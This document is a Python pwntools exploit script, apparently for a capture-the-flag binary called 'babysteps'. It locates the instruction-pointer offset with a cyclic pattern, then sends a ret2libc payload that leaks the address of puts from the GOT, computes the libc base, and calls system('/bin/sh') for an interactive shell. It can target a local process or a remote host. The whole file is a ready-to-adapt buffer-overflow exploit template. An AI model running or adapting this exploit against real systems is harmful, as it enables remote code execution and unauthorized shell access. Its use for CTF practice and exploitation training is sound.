from pwn import *


# Allows you to switch between local/GDB/remote from terminal
def start(argv=[], *a, **kw):
    if args.GDB:  # Set GDBscript below
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:  # ('server', 'port')
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:  # Run locally
        return process([exe] + argv, *a, **kw)


# Find offset to EIP/RIP for buffer overflows
def find_ip(payload):
    # Launch process and send payload
    p = process(exe, level='warn')
    p.sendlineafter(b'?', payload)
    # Wait for the process to crash
    p.wait()
    # Print out the address of EIP/RIP at the time of crashing
    ip_offset = cyclic_find(p.corefile.pc)  # x86
    # ip_offset = cyclic_find(p.corefile.read(p.corefile.sp, 4))  # x64
    warn('located EIP/RIP offset at {a}'.format(a=ip_offset))
    return ip_offset


# Specify GDB script here (breakpoints etc)
gdbscript = '''
init-pwndbg
continue
'''.format(**locals())

# Binary filename
exe = './babysteps'
# This will automatically get context arch, bits, os etc
elf = context.binary = ELF(exe, checksec=False)
# Change logging level to help with debugging (error/warning/info/debug)
context.log_level = 'debug'

# ===========================================================
#                    EXPLOIT GOES HERE
# ===========================================================

# Lib-C library, can use pwninit/patchelf to patch binary
libc = ELF("./libc6-i386_2.35-0ubuntu3_amd64.so")

# Pass in pattern_size, get back EIP/RIP offset
offset = find_ip(cyclic(500))

# Start program
io = start()

# Payload to leak libc function
payload = flat({
    offset: [
        elf.plt.puts,  # Call puts(x)
        elf.symbols.ask_baby_name,  # Return here
        elf.got.puts  # x = Leak got.puts
    ]
})

# Send the payload
io.sendlineafter(b'what is your baby name?', payload)

io.recvline()  # Receive the newline

# Retrieve got.puts address
got_puts = unpack(io.recv()[:4].ljust(4, b"\x00"))
info("leaked got_puts: %#x", got_puts)

# Subtract puts offset to get libc base
libc.address = got_puts - libc.symbols.puts
info("libc_base: %#x", libc.address)

# System(/bin/sh)
info("system_addr: %#x", libc.symbols.system)
bin_sh = next(libc.search(b'/bin/sh\x00'))
info("bin_sh: %#x", bin_sh)

# Payload to get shell
payload = flat({
    offset: [
        libc.symbols.system,  # system(x)
        0x0,  # return
        bin_sh  # x = "/bin/sh"
    ]
})

# Send the payload
io.sendline(payload)

# Got Shell?
io.interactive()
